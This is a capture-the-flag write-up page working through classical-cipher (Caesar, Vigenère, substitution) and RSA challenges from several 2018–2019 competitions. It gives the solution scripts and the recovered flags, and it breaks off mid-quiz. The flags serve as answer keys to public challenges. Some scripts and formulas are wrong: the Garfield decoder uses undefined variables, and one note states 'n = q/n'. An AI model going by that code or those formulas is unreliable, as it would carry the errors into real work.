<!doctype html><html lang=en class="sidebar-visible no-js ayu"><meta charset=utf-8><title>Capture The Flag</title><meta name=robots content="noindex"><meta charset=utf-8><meta name=description content><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content="#ffffff"><link rel="shortcut icon" href=favicon.png><link rel=stylesheet href=css/variables.css><link rel=stylesheet href=css/general.css><link rel=stylesheet href=css/chrome.css><link rel=stylesheet href=css/print.css media=print><link rel=stylesheet href=FontAwesome/css/font-awesome.css><link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel=stylesheet><link rel=stylesheet href=highlight.css><link rel=stylesheet href=tomorrow-night.css><link rel=stylesheet href=ayu-highlight.css><link rel=stylesheet href=theme/mermaid.css><script>var path_to_root="";var default_theme=window.matchMedia("(prefers-color-scheme: dark)").matches?"ayu":"ayu";</script><script>try{var theme=localStorage.getItem('mdbook-theme');var sidebar=localStorage.getItem('mdbook-sidebar');if(theme.startsWith('"')&&theme.endsWith('"')){localStorage.setItem('mdbook-theme',theme.slice(1,theme.length-1));}
if(sidebar.startsWith('"')&&sidebar.endsWith('"')){localStorage.setItem('mdbook-sidebar',sidebar.slice(1,sidebar.length-1));}}catch(e){}</script><script>var theme;try{theme=localStorage.getItem('mdbook-theme');}catch(e){}
if(theme===null||theme===undefined){theme=default_theme;}
var html=document.querySelector('html');html.classList.remove('no-js')
html.classList.remove('ayu')
html.classList.add(theme);html.classList.add('js');</script><script>var html=document.querySelector('html');var sidebar='hidden';if(document.body.clientWidth>=1080){try{sidebar=localStorage.getItem('mdbook-sidebar');}catch(e){}
sidebar=sidebar||'visible';}
html.classList.remove('sidebar-visible');html.classList.add("sidebar-"+sidebar);</script><nav id=sidebar class=sidebar aria-label="Table of contents"><div id=sidebar-scrollbox class=sidebar-scrollbox><ol class=chapter><li class=expanded><a href=index.html><strong aria-hidden=true>1.</strong> Introduction</a><li class=expanded><a href=ctf/index.html><strong aria-hidden=true>2.</strong> Capture The Flag</a><li><ol class=section><li class=expanded><a href=ctf/crypto/index.html><strong aria-hidden=true>2.1.</strong> Crypto</a><li><ol class=section><li class=expanded><a href=ctf/crypto/hackcon18-caesar.html><strong aria-hidden=true>2.1.1.</strong> Hackcon2018 Caesar Salad</a><li class=expanded><a href=ctf/crypto/hackcon18-salad.html><strong aria-hidden=true>2.1.2.</strong> Hackcon2018 Salad Up.</a><li class=expanded><a href=ctf/crypto/icectf18q-garfield.html><strong aria-hidden=true>2.1.3.</strong> IceCTF18Q Garfield</a><li class=expanded><a href=ctf/crypto/tjctf18-classic.html><strong aria-hidden=true>2.1.4.</strong> TJCTF18 Classic</a><li class=expanded><a href=ctf/crypto/picoctf19-numbers.html><strong aria-hidden=true>2.1.5.</strong> PicoCTF19 The Numbers</a><li class=expanded><a href=ctf/crypto/picoctf19-caesar.html><strong aria-hidden=true>2.1.6.</strong> PicoCTF19 Caesar</a><li class=expanded><a href=ctf/crypto/picoctf19-wavesoverlambda.html><strong aria-hidden=true>2.1.7.</strong> PicoCTF19 Waves Lambda</a><li class=expanded><a href=ctf/crypto/picoctf19-lacifrede.html><strong aria-hidden=true>2.1.8.</strong> PicoCTF19 La Cifra De</a><li class=expanded><a href=ctf/crypto/picoctf19-rsapopquiz.html><strong aria-hidden=true>2.1.9.</strong> PicoCTF19 RSA Pop Quiz</a><li class=expanded><a href=ctf/crypto/picoctf19-minirsa.html><strong aria-hidden=true>2.1.10.</strong> PicoCTF19 miniRSA</a><li class=expanded><a href=ctf/crypto/picoctf19-b00tl3gRSA2.html><strong aria-hidden=true>2.1.11.</strong> PicoCTF19 b00tl3gRSA2</a><li class=expanded><a href=ctf/crypto/picoctf19-b00tl3gRSA3.html><strong aria-hidden=true>2.1.12.</strong> PicoCTF19 b00tl3gRSA3</a><li class=expanded><a href=ctf/crypto/picoctf19-john_pollard.html><strong aria-hidden=true>2.1.13.</strong> PicoCTF19 john_pollard</a><li class=expanded><a href=ctf/crypto/picoctf19-aesabc.html><strong aria-hidden=true>2.1.14.</strong> PicoCTF19 AES-ABC</a></ol><li class=expanded><a href=ctf/forensics/index.html><strong aria-hidden=true>2.2.</strong> Forensics</a><li><ol class=section><li class=expanded><a href=ctf/forensics/picoctf19-garden.html><strong aria-hidden=true>2.2.1.</strong> PicoCTF19 Garden</a><li class=expanded><a href=ctf/forensics/picoctf19-unzip.html><strong aria-hidden=true>2.2.2.</strong> PicoCTF19 Unzip</a><li class=expanded><a href=ctf/forensics/picoctf19-so-meta.html><strong aria-hidden=true>2.2.3.</strong> PicoCTF19 So Meta</a><li class=expanded><a href=ctf/forensics/picoctf19-what-lies-within.html><strong aria-hidden=true>2.2.4.</strong> PicoCTF19 Lies Within</a><li class=expanded><a href=ctf/forensics/picoctf19-extensions.html><strong aria-hidden=true>2.2.5.</strong> PicoCTF19 Extensions</a><li class=expanded><a href=ctf/forensics/picoctf19-shark-on-wire-1.html><strong aria-hidden=true>2.2.6.</strong> PicoCTF19 Shark Wire</a><li class=expanded><a href=ctf/forensics/picoctf19-whitepages.html><strong aria-hidden=true>2.2.7.</strong> PicoCTF19 WhitePages</a><li class=expanded><a href=ctf/forensics/picoctf19-like1000.html><strong aria-hidden=true>2.2.8.</strong> PicoCTF19 like1000</a></ol><li class=expanded><a href=ctf/web/index.html><strong aria-hidden=true>2.3.</strong> Web</a><li><ol class=section><li class=expanded><a href=ctf/web/seccon19-web_search.html><strong aria-hidden=true>2.3.1.</strong> SECCON19 Web Search</a><li class=expanded><a href=ctf/web/tmctf19-finals-containers.html><strong aria-hidden=true>2.3.2.</strong> TMCTF19F Container</a></ol></ol></ol></div><div id=sidebar-resize-handle class=sidebar-resize-handle></div></nav><div id=page-wrapper class=page-wrapper><div class=page><div id=menu-bar class=menu-bar><div id=menu-bar-sticky-container><div class=left-buttons><button id=sidebar-toggle class=icon-button type=button title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls=sidebar>
<i class="fa fa-bars"></i></button>
<button id=theme-toggle class=icon-button type=button title="Change theme" aria-label="Change theme" aria-haspopup=true aria-expanded=false aria-controls=theme-list>
<i class="fa fa-paint-brush"></i></button><ul id=theme-list class=theme-popup aria-label=Themes role=menu><li role=none><button role=menuitem class=theme id=light>Light</button><li role=none><button role=menuitem class=theme id=rust>Rust</button><li role=none><button role=menuitem class=theme id=coal>Coal</button><li role=none><button role=menuitem class=theme id=navy>Navy</button><li role=none><button role=menuitem class=theme id=ayu>Ayu (default)</button></ul><button id=search-toggle class=icon-button type=button title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded=false aria-keyshortcuts=S aria-controls=searchbar>
<i class="fa fa-search"></i></button></div><h1 class=menu-title>Capture The Flag</h1><div class=right-buttons><a href=print.html title="Print this book" aria-label="Print this book"><i id=print-button class="fa fa-print"></i></a><a href=https://github.com/sgama/ctf.samsongama.com title="Git repository" aria-label="Git repository"><i id=git-repository-button class="fa fa-github"></i></a></div></div></div><div id=search-wrapper class=hidden><form id=searchbar-outer class=searchbar-outer><input type=search name=search id=searchbar name=searchbar placeholder="Search this book ..." aria-controls=searchresults-outer aria-describedby=searchresults-header></form><div id=searchresults-outer class="searchresults-outer hidden"><div id=searchresults-header class=searchresults-header></div><ul id=searchresults></ul></div></div><script>document.getElementById('sidebar-toggle').setAttribute('aria-expanded',sidebar==='visible');document.getElementById('sidebar').setAttribute('aria-hidden',sidebar!=='visible');Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link){link.setAttribute('tabIndex',sidebar==='visible'?0:-1);});</script><div id=content class=content><main><h1><a class=header href=#introduction id=introduction>Introduction</a></h1><p><a href=https://actions-badge.atrox.dev/sgama/ctf.samsongama.com/goto><img src="https://img.shields.io/endpoint.svg?url=https%3A%2F%2Factions-badge.atrox.dev%2Fsgama%2Fctf.samsongama.com%2Fbadge&style=flat-square" alt="Build Status"></a>
<img src="https://img.shields.io/github/commit-activity/m/sgama/ctf.samsongama.com?style=flat-square" alt="GitHub commit activity">
<img src="https://img.shields.io/github/last-commit/sgama/ctf.samsongama.com?style=flat-square" alt="GitHub last commit">
<img src="https://img.shields.io/github/repo-size/sgama/ctf.samsongama.com?style=flat-square" alt="GitHub repo size"><p>Placeholder for future data.<p>Dumping possible syntax here<pre><code class=language-javascript>var s = &quot;JavaScript syntax highlighting&quot;;
alert(s);
</code></pre><pre><code class=language-python>s = &quot;Python syntax highlighting&quot;
print s
</code></pre><pre><code>No language indicated, so no syntax highlighting. 
But let's throw in a &lt;b&gt;tag&lt;/b&gt;.
</code></pre><table><thead><tr><th>Tables<th align=center>Are<th align=right>Cool<tbody><tr><td>col 3 is<td align=center>right-aligned<td align=right>$1600<tr><td>col 2 is<td align=center>centered<td align=right>$12<tr><td>zebra stripes<td align=center>are neat<td align=right>$1</table><hr><p>Example of MermaidJS<pre class=mermaid>graph TD;
    A-->B;
    A-->C;
    B-->D;
    C-->D;
</pre><h1><a class=header href=#capture-the-flag id=capture-the-flag>Capture The Flag</a></h1><p><img src=ctf/ctf.jpg alt="alt text" title="Logo Title Text 1"><p>Find the flag<h1><a class=header href=#crypto id=crypto>Crypto</a></h1><p>Placeholder for crypto resources<h1><a class=header href=#hackcon2018-caesar-salad id=hackcon2018-caesar-salad>Hackcon2018 Caesar Salad</a></h1><pre><code>Can you toss Caesar's salad?

q4ex{tlg_thq_p4rf4e}p0qr
</code></pre><hr><pre><code class=language-bash>$ echo &quot;q4ex{tlg_thq_p4rf4e}p0qr&quot; | rot13
d4rk{g1t_gud_c4es4r}c0de
</code></pre><h1><a class=header href=#hackcon2018-salad-upgrades id=hackcon2018-salad-upgrades>Hackcon2018 Salad Upgrades</a></h1><pre><code>Sure, I could toss them all using just one shift. But am I gonna?

CIPHERTEXT: e4uo{zo1b_1e_f0j4l10i}z0ce
</code></pre><hr><p>Attempt Caesar<pre><code class=language-bash>$ for i in {1..26}; do echo &quot;e4uo{zo1b_1e_f0j4l10i}z0ce&quot; | caesar $i; done
f4vp{ap1c_1f_g0k4m10j}a0df
g4wq{bq1d_1g_h0l4n10k}b0eg
h4xr{cr1e_1h_i0m4o10l}c0fh
i4ys{ds1f_1i_j0n4p10m}d0gi
j4zt{et1g_1j_k0o4q10n}e0hj
k4au{fu1h_1k_l0p4r10o}f0ik
l4bv{gv1i_1l_m0q4s10p}g0jl
m4cw{hw1j_1m_n0r4t10q}h0km
n4dx{ix1k_1n_o0s4u10r}i0ln
o4ey{jy1l_1o_p0t4v10s}j0mo
p4fz{kz1m_1p_q0u4w10t}k0np
q4ga{la1n_1q_r0v4x10u}l0oq
r4hb{mb1o_1r_s0w4y10v}m0pr
s4ic{nc1p_1s_t0x4z10w}n0qs
t4jd{od1q_1t_u0y4a10x}o0rt
u4ke{pe1r_1u_v0z4b10y}p0su
v4lf{qf1s_1v_w0a4c10z}q0tv
w4mg{rg1t_1w_x0b4d10a}r0uw
x4nh{sh1u_1x_y0c4e10b}s0vx
y4oi{ti1v_1y_z0d4f10c}t0wy
z4pj{uj1w_1z_a0e4g10d}u0xz
a4qk{vk1x_1a_b0f4h10e}v0ya
b4rl{wl1y_1b_c0g4i10f}w0zb
c4sm{xm1z_1c_d0h4j10g}x0ac
d4tn{yn1a_1d_e0i4k10h}y0bd
e4uo{zo1b_1e_f0j4l10i}z0ce
</code></pre><p>None match the flag format. Try Vignere Cipher.
Hint being "not just one shift"<pre><code class=language-python>import string
import collections


cipher = 'e4uo{zo1b_1e_f0j4l10i}z0ce'

# key 12345...

result = ''
i = 1


for char in cipher:
    lowercase = collections.deque(string.lowercase)
    if char not in string.digits and char != '{' and char != '}' and char != '_':
        cipher_index = string.lowercase.index(char)
        lowercase.rotate(i)
        result += lowercase[cipher_index]
    else:
        result += char
    i += 1

print(result)
</code></pre><h1><a class=header href=#icectf18q-garfield id=icectf18q-garfield>IceCTF18Q Garfield</a></h1><p><img src=ctf/crypto/assets/garfeld.png alt=Garfeld.png title=Garfeld.png><pre><code>IjgJUO{P_LOUV_AIRUS_GYQUTOLTD_SKRFB_TWNKCFT}
07271978
</code></pre><p>are found in the picture<p>Note:<p><code>IjgJUO{P_LOUV_AIRUS_GYQUTOLTD_SKRFB_TWNKCFT}</code> -> seems to be the flag
<code>I + 0 = I</code>, <code>j - 7 = c</code>, <code>g - 2 = e</code> .... seee a pattern?<p><code>Garfield</code> is spelt as <code>Garfeld</code><pre><code class=language-python>#!/usr/bin/env python
numbers = '07271978'
flag =[]
with open(&quot;message.txt&quot;) as handle:
    message = handle.read()
    counter = 0
    for c in message:
        c = c.upper()

        if (c in uppercase):
            index = uppercase.index(c)
            offset = int(numbers[counter % len(numbers)])
            new_char = uppercase[index - offset]
            flag.append(new_c)
            counter += 1
        else:
            flag.append(character)
print ''.join(flag)
</code></pre><p>ICECTF{I_DONT_THINK_GRONSFELD_LIKES_MONDAYS}<h1><a class=header href=#tjctf18-classic id=tjctf18-classic>TJCTF18 Classic</a></h1><h2><a class=header href=#challenge id=challenge>Challenge</a></h2><p>My primes might be close in size but they're big enough that it shouldn't matter right?<p><code>rsa.txt</code><pre><code>e = 65537
n = 128299637852747781491257187842028484364103855748297296704808405762229741626342194440837748106022068295635777844830831811978557490708404900063082674039252789841829590381008343327258960595508204744589399243877556198799438322881052857422197506822302290812621883700357890208069551876513290323124813780520689585503
c = 43160414063424128744492209010823042660025171642991046645158489731385945722740307002278661617111192557638773493117905684302084789590107080892369738949935010170735247383608959796206619491522997896941432858113478736544386518678449541064813172833593755715667806740002726487780692635238838746604939551393627585159
</code></pre><h2><a class=header href=#solution id=solution>Solution</a></h2><p>Probably called classic because it's classic RSA.<pre><code>E is the exponent
N is the modulus
C is the ciphertext
</code></pre><p>Attempt to find primes:<pre><code>http://factordb.com/index.php?query=128299637852747781491257187842028484364103855748297296704808405762229741626342194440837748106022068295635777844830831811978557490708404900063082674039252789841829590381008343327258960595508204744589399243877556198799438322881052857422197506822302290812621883700357890208069551876513290323124813780520689585503&amp;use=n&amp;n=1&amp;VP=on&amp;VC=on&amp;EV=on&amp;OD=on&amp;PR=on&amp;FF=on&amp;PRP=on&amp;CF=on&amp;U=on&amp;C=on&amp;perpage=20&amp;format=1
</code></pre><p>Factors found! Otherwise, would have to look here: https://alpertron.com.ar/ECM.HTM<pre><code>p = 11326943005628119672694629821649856331564947811949928186125208046290130000912120768861173564277210907403841603312764378561200102283658817695884193223692869
q = 11326943005628119672694629821649856331564947811949928186125208046290130000912216246378177299696220728414241927034282796937320547048361486068608744598351187
</code></pre><pre><code class=language-python>#!/usr/bin/env python

from Crypto.Util.number import inverse

e = 65537
n = 128299637852747781491257187842028484364103855748297296704808405762229741626342194440837748106022068295635777844830831811978557490708404900063082674039252789841829590381008343327258960595508204744589399243877556198799438322881052857422197506822302290812621883700357890208069551876513290323124813780520689585503
c = 43160414063424128744492209010823042660025171642991046645158489731385945722740307002278661617111192557638773493117905684302084789590107080892369738949935010170735247383608959796206619491522997896941432858113478736544386518678449541064813172833593755715667806740002726487780692635238838746604939551393627585159
p = 11326943005628119672694629821649856331564947811949928186125208046290130000912120768861173564277210907403841603312764378561200102283658817695884193223692869
q = 11326943005628119672694629821649856331564947811949928186125208046290130000912216246378177299696220728414241927034282796937320547048361486068608744598351187

phi = (p-1)*(q-1)
d = inverse(e, phi)
m = pow(c, d, n)
print(hex(m)[2:-1].decode('hex'))
</code></pre><h2><a class=header href=#flag id=flag>Flag</a></h2><p><code>tjctf{1_l1ke_squares}</code><h1><a class=header href=#picoctf19-the-numbers id=picoctf19-the-numbers>PicoCTF19 The Numbers</a></h1><h2><a class=header href=#challenge-1 id=challenge-1>Challenge</a></h2><p>The <a href=https://2019shell1.picoctf.com/static/880cb722e666005093d6c2c5751ec042/the_numbers.png>numbers</a>... what do they mean?<p><img src=ctf/crypto/assets/the_numbers.png alt=the_numbers.png title=the_numbers.png><h2><a class=header href=#hint id=hint>Hint</a></h2><p>The flag is in the format PICOCTF{}<h2><a class=header href=#solution-1 id=solution-1>Solution</a></h2><p>This looks like the Letter Number Cipher (known as A1Z26):<p>Use <a href=https://www.dcode.fr/letter-number-cipher>this</a> to decode the message.<pre><code>16 9 3 15 3 20 6 { 20 8 5 14 21 13 2 5 18 19 13 1 19 15 14 }
</code></pre><h3><a class=header href=#flag-1 id=flag-1>Flag</a></h3><p><code>PICOCTF{THENUMBERSMASON}</code><h1><a class=header href=#picoctf19-caesar id=picoctf19-caesar>PicoCTF19 Caesar</a></h1><h2><a class=header href=#challenge-2 id=challenge-2>Challenge</a></h2><p>Decrypt this <a href=https://2019shell1.picoctf.com/static/dd13c821b22c2f3bd7ea8825ff733cc1/ciphertext>message</a>. You can find the ciphertext in /problems/caesar_5_d706b250ed3c6d2d2c72155de301a2f1 on the shell server.<p><code>picoCTF{dspttjohuifsvcjdpobqjtwtvk}</code><h3><a class=header href=#hints id=hints>Hints</a></h3><p>caesar cipher <a href=https://learncryptography.com/classical-encryption/caesar-cipher>tutorial</a><h2><a class=header href=#solution-2 id=solution-2>Solution</a></h2><p>There's only 26 possibilities for a Caesar cipher. There probably exists a tool online somewhere.<p><a href=https://cryptii.com/pipes/caesar-cipher>https://cryptii.com/pipes/caesar-cipher</a><p>Since the <code>picoCTF</code> isn't part of the flag, there's no way of knowing which substitution is correct so lets click through hoping to see some English.<p>Success on +25<h3><a class=header href=#flag-2 id=flag-2>Flag</a></h3><p><code>picoCTF{crossingtherubiconapisvsuj}</code><h1><a class=header href=#picoctf19-waves-lambda id=picoctf19-waves-lambda>PicoCTF19 Waves Lambda</a></h1><h2><a class=header href=#challenge-3 id=challenge-3>Challenge</a></h2><p>We made alot of substitutions to encrypt this. Can you decrypt it? Connect with <code>nc 2019shell1.picoctf.com 32282</code>.<h3><a class=header href=#hints-1 id=hints-1>Hints</a></h3><p>Flag is not in the usual flag format<h2><a class=header href=#solution-3 id=solution-3>Solution</a></h2><pre><code class=language-bash>$ nc 2019shell1.picoctf.com 32282
-------------------------------------------------------------------------------
qsfaoimw bpop xw ysco dkia - dopzcpfqy_xw_q_supo_kithei_jmmbmmshcq
-------------------------------------------------------------------------------
hpmlppf cw mbpop liw, iw x biup ikopiey wixe wstplbpop, mbp hsfe sd mbp wpi. hpwxepw bskexfa sco bpiomw msapmbpo mboscab ksfa jpoxsew sd wpjioimxsf, xm bie mbp pddpqm sd tinxfa cw mskpoifm sd piqb smbpo'w yiofwife pupf qsfuxqmxsfw. mbp kilypombp hpwm sd ske dpkkslwbie, hpqicwp sd bxw tify ypiow ife tify uxomcpw, mbp sfky qcwbxsf sf epqn, ife liw kyxfa sf mbp sfky oca. mbp iqqscfmifm bie hoscabm scm ikopiey i hsg sd estxfspw, ife liw msyxfa ioqbxmpqmcoikky lxmb mbp hsfpw. tioksl wim qosww-kpaape oxabm idm, kpifxfa iaixfwm mbp txvvpf-tiwm. bp bie wcfnpf qbppnw, i ypkksl qstjkpgxsf, i wmoixabm hiqn, if iwqpmxq iwjpqm, ife, lxmb bxw iotw eosjjpe, mbp jiktw sd bifew scmlioew, opwpthkpe if xesk. mbp exopqmso, wimxwdxpe mbp ifqbso bie asse bske, tiep bxw liy idm ife wim eslf itsfawm cw. lp pgqbifape i dpl lsoew kivxky. idmpolioew mbpop liw wxkpfqp sf hsioe mbp yiqbm. dso wstp opiwsf so smbpo lp exe fsm hpaxf mbim aitp sd estxfspw. lp dpkm tpexmimxup, ife dxm dso fsmbxfa hcm jkiqxe wmioxfa. mbp eiy liw pfexfa xf i wpopfxmy sd wmxkk ife pgzcxwxmp hoxkkxifqp. mbp limpo wbsfp jiqxdxqikky; mbp wny, lxmbscm i wjpqn, liw i hpfxaf xttpfwxmy sd cfwmixfpe kxabm; mbp upoy txwm sf mbp pwwpg tiowb liw kxnp i aicvy ife oiexifm dihoxq, bcfa dost mbp lssepe oxwpw xfkife, ife eoijxfa mbp ksl wbsopw xf exijbifscw dskew. sfky mbp aksst ms mbp lpwm, hossexfa supo mbp cjjpo opiqbpw, hpqitp tsop wsthop pupoy txfcmp, iw xd ifapope hy mbp ijjosiqb sd mbp wcf.
</code></pre><p>Seems to be some sort of email or letter. Could be any cipher. Let's try our tools:
<a href=https://www.guballa.de/substitution-solver>https://www.guballa.de/substitution-solver</a><pre><code>-------------------------------------------------------------------------------
congrats here is your flag - frequency_is_c_over_lambda_ptthttobuc
-------------------------------------------------------------------------------
between us there was, as i have already said somewhere, the bond of the sea. besides holding our hearts together through long periods of separation, it had the effect of making us tolerant of each other's yarnsand even convictions. the lawyerthe best of old fellowshad, because of his many years and many virtues, the only cushion on deck, and was lying on the only rug. the accountant had brought out already a box of dominoes, and was toying architecturally with the bones. marlow sat cross-legged right aft, leaning against the mizzen-mast. he had sunken cheeks, a yellow complexion, a straight back, an ascetic aspect, and, with his arms dropped, the palms of hands outwards, resembled an idol. the director, satisfied the anchor had good hold, made his way aft and sat down amongst us. we exchanged a few words lazily. afterwards there was silence on board the yacht. for some reason or other we did not begin that game of dominoes. we felt meditative, and fit for nothing but placid staring. the day was ending in a serenity of still and exquisite brilliance. the water shone pacifically; the sky, without a speck, was a benign immensity of unstained light; the very mist on the essex marsh was like a gauzy and radiant fabric, hung from the wooded rises inland, and draping the low shores in diaphanous folds. only the gloom to the west, brooding over the upper reaches, became more sombre every minute, as if angered by the approach of the sun.
</code></pre><h3><a class=header href=#flag-3 id=flag-3>Flag</a></h3><p><code>picoCTF{frequency_is_c_over_lambda_ptthttobuc}</code><h1><a class=header href=#picoctf19-la-cifra-de id=picoctf19-la-cifra-de>PicoCTF19 La Cifra De</a></h1><h2><a class=header href=#challenge-4 id=challenge-4>Challenge</a></h2><p>I found this cipher in an old book. Can you figure out what it says? Connect with 'nc 2019shell1.picoctf.com 12254'.<h3><a class=header href=#hints-2 id=hints-2>Hints</a></h3><p>There are tools that make this easy.<p>Perhaps looking at history will help<h2><a class=header href=#solution-4 id=solution-4>Solution</a></h2><pre><code class=language-bash>$ nc 2019shell1.picoctf.com 12254
Encrypted message:
﻿Ne iy nytkwpsznyg nth it mtsztcy vjzprj zfzjy rkhpibj nrkitt ltc tnnygy ysee itd tte cxjltk

Ifrosr tnj noawde uk siyyzre, yse Bnretèwp Cousex mls hjpn xjtnbjytki xatd eisjd

Iz bls lfwskqj azycihzeej yz Brftsk ip Volpnèxj ls oy hay tcimnyarqj dkxnrogpd os 1553 my Mnzvgs Mazytszf Merqlsu ny hox moup Wa inqrg ipl. Ynr. Gotgat Gltzndtg Gplrfdo

Ltc tnj tmvqpmkseaznzn uk ehox nivmpr g ylbrj ts ltcmki my yqtdosr tnj wocjc hgqq ol fy oxitngwj arusahje fuw ln guaaxjytrd catizm tzxbkw zf vqlckx hizm ceyupcz yz tnj fpvjc hgqqpohzCZK{m311a50_0x_a1rn3x3_h1ah3xf653pdkh}

Ehk ktryy herq-ooizxetypd jjdcxnatoty ol f aordllvmlbkytc inahkw socjgex, bls sfoe gwzuti 1467 my Rjzn Hfetoxea Gqmexyt.

Tnj Gimjyèrk Htpnjc iy ysexjqoxj dosjeisjd cgqwej yse Gqmexyt Doxn ox Fwbkwei Inahkw.

Tn 1508, Ptsatsps Zwttnjxiax tnbjytki ehk xz-cgqwej ylbaql rkhea (g rltxni ol xsilypd gqahggpty) ysaz bzuri wazjc bk f nroytcgq nosuznkse ol yse Bnretèwp Cousex.

Gplrfdo’y xpcuso butvlky lpvjlrki tn 1555 gx l cuseitzltoty ol yse lncsz. Yse rthex mllbjd ol yse gqahggpty fce tth snnqtki cemzwaxqj, bay ehk fwpnfmezx lnj yse osoed qptzjcs gwp mocpd hd xegsd ol f xnkrznoh vee usrgxp, wnnnh ify bk itfljcety hizm paim noxwpsvtydkse.
</code></pre><p>Well could be a subsitution cipher or any other, lets try our tools:<p><a href=https://www.guballa.de/vigenere-solver>https://www.guballa.de/vigenere-solver</a><pre><code>﻿It is interesting how in history people often receive credit for things they did not create

During the course of history, the Vigenère Cipher has been reinvented many times

It was falsely attributed to Blaise de Vigenère as it was originally described in 1553 by Giovan Battista Bellaso in his book La cifra del. Sig. Giovan Battista Bellaso

For the implementation of this cipher a table is formed by sliding the lower half of an ordinary alphabet for an apparently random number of places with respect to the upper halfpicoCTF{b311a50_0r_v1gn3r3_c1ph3ra653edec}

The first well-documented description of a polyalphabetic cipher however, was made around 1467 by Leon Battista Alberti.

The Vigenère Cipher is therefore sometimes called the Alberti Disc or Alberti Cipher.

In 1508, Johannes Trithemius invented the so-called tabula recta (a matrix of shifted alphabets) that would later be a critical component of the Vigenère Cipher.

Bellaso’s second booklet appeared in 1555 as a continuation of the first. The lower halves of the alphabets are now shifted regularly, but the alphabets and the index letters are mixed by means of a mnemonic key phrase, which can be different with each correspondent.
</code></pre><p>It worked... we see: <code>picoCTF{b311a50_0r_v1gn3r3_c1ph3ra653edec}</code><h3><a class=header href=#flag-4 id=flag-4>Flag</a></h3><p><code>picoCTF{b311a50_0r_v1gn3r3_c1ph3ra653edec}</code><h1><a class=header href=#picoctf19-rsa-pop-quiz id=picoctf19-rsa-pop-quiz>PicoCTF19 RSA Pop Quiz</a></h1><h2><a class=header href=#challenge-5 id=challenge-5>Challenge</a></h2><p>Class, take your seats! It's PRIME-time for a quiz... <code>nc 2019shell1.picoctf.com 2611</code><h3><a class=header href=#hints-3 id=hints-3>Hints</a></h3><p><a href=https://simple.wikipedia.org/wiki/RSA_algorithm>RSA info</a><h2><a class=header href=#solution-5 id=solution-5>Solution</a></h2><pre><code>$ nc 2019shell1.picoctf.com 2611
Good morning class! It's me Ms. Adleman-Shamir-Rivest
Today we will be taking a pop quiz, so I hope you studied. Cramming just will not do!
You will need to tell me if each example is possible, given your extensive crypto knowledge.
Inputs and outputs are in decimal. No hex here!
#### NEW PROBLEM ####
q : 60413
p : 76753
##### PRODUCE THE FOLLOWING ####
n
</code></pre><p>We know <code>n=p*q</code><pre><code>#### TIME TO SHOW ME WHAT YOU GOT! ###
n: 4636878989
Outstanding move!!!


#### NEW PROBLEM ####
p : 54269
n : 5051846941
##### PRODUCE THE FOLLOWING ####
q
</code></pre><p>We know <code>n = q/n</code><pre><code>#### TIME TO SHOW ME WHAT YOU GOT! ###
q: 93089
Outstanding move!!!


#### NEW PROBLEM ####
e : 3
n : 12738162802910546503821920886905393316386362759567480839428456525224226445173031635306683726182522494910808518920409019414034814409330094245825749680913204566832337704700165993198897029795786969124232138869784626202501366135975223827287812326250577148625360887698930625504334325804587329905617936581116392784684334664204309771430814449606147221349888320403451637882447709796221706470239625292297988766493746209684880843111138170600039888112404411310974758532603998608057008811836384597579147244737606088756299939654265086899096359070667266167754944587948695842171915048619846282873769413489072243477764350071787327913
##### PRODUCE THE FOLLOWING ####
q
p
</code></pre><p>We know <code>toitent(n)=(p-1)(q-1)</code> but we don't have the toitent.<pre><code>IS THIS POSSIBLE and FEASIBLE? (Y/N):N
Outstanding move!!!


#### NEW PROBLEM ####
q : 66347
p : 12611
##### PRODUCE THE FOLLOWING ####
totient(n)
</code></pre><p>We know: <code>toitent(n)=(p-1)(q-1)</code><pre><code>IS THIS POSSIBLE and FEASIBLE? (Y/N):Y
#### TIME TO SHOW ME WHAT YOU GOT! ###
totient(n): ^V836623060
Outstanding move!!!


#### NEW PROBLEM ####
plaintext : 6357294171489311547190987615544575133581967886499484091352661406414044440475205342882841236357665973431462491355089413710392273380203038793241564304774271529108729717
e : 3
n : 29129463609326322559521123136222078780585451208149138547799121083622333250646678767769126248182207478527881025116332742616201890576280859777513414460842754045651093593251726785499360828237897586278068419875517543013545369871704159718105354690802726645710699029936754265654381929650494383622583174075805797766685192325859982797796060391271817578087472948205626257717479858369754502615173773514087437504532994142632207906501079835037052797306690891600559321673928943158514646572885986881016569647357891598545880304236145548059520898133142087545369179876065657214225826997676844000054327141666320553082128424707948750331
##### PRODUCE THE FOLLOWING ####
ciphertext
</code></pre><p>We know: <code>c = plaintext^e mod n</code><pre><code>

#### NEW PROBLEM ####
ciphertext : 107524013451079348539944510756143604203925717262185033799328445011792760545528944993719783392542163428637172323512252624567111110666168664743115203791510985709942366609626436995887781674651272233566303814979677507101168587739375699009734588985482369702634499544891509228440194615376339573685285125730286623323
e : 3
n : 27566996291508213932419371385141522859343226560050921196294761870500846140132385080994630946107675330189606021165260590147068785820203600882092467797813519434652632126061353583124063944373336654246386074125394368479677295167494332556053947231141336142392086767742035970752738056297057898704112912616565299451359791548536846025854378347423520104947907334451056339439706623069503088916316369813499705073573777577169392401411708920615574908593784282546154486446779246790294398198854547069593987224578333683144886242572837465834139561122101527973799583927411936200068176539747586449939559180772690007261562703222558103359
##### PRODUCE THE FOLLOWING ####
plaintext
</code></pre><p>We don't know <code>p</code> and <code>q</code><pre><code>IS THIS POSSIBLE and FEASIBLE? (Y/N):N
Outstanding move!!!


#### NEW PROBLEM ####
q : 92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559
p : 97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637
e : 65537
##### PRODUCE THE FOLLOWING ####
d
</code></pre><p>We know: <code>d=e^-1 mod ((p-1)(q-1))</code><pre><code class=language-python>from Crypto.Util.number import *

q = ''
p = ''
e = ''
print(inverse(e,((p-1)(q-1))))
</code></pre><p>Easy.<pre><code>IS THIS POSSIBLE and FEASIBLE? (Y/N):Y
#### TIME TO SHOW ME WHAT YOU GOT! ###
